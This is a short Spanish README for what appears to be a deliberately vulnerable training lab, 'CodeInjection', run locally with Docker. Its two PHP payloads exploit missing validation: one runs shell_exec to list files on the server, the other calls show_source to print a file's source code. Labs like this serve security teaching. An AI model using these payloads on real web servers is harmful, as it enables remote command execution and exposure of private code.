# Code Injection

Descargar y Montar el servidor desde Docker usando un volumen con el Codigo Fuente de Github para editarlo:

```bash
git clone https://github.com/IngenieroRicardo/CodeInjection
sudo docker-compose up
firefox localhost:8181
```

<hr>

Al no tener validaciones se pueden enviar PHP que se pueden ejecutar como estos:

```php
<?php
  $salida = shell_exec("cd .. && ls");
  echo "<pre>$salida</pre>";
?>
```
Con este codigo podemos conocer los archivos en el servidor


```php
<?php
  show_source("../archivos.php");
?>
```
Con este codigo podemos ver codigo fuente
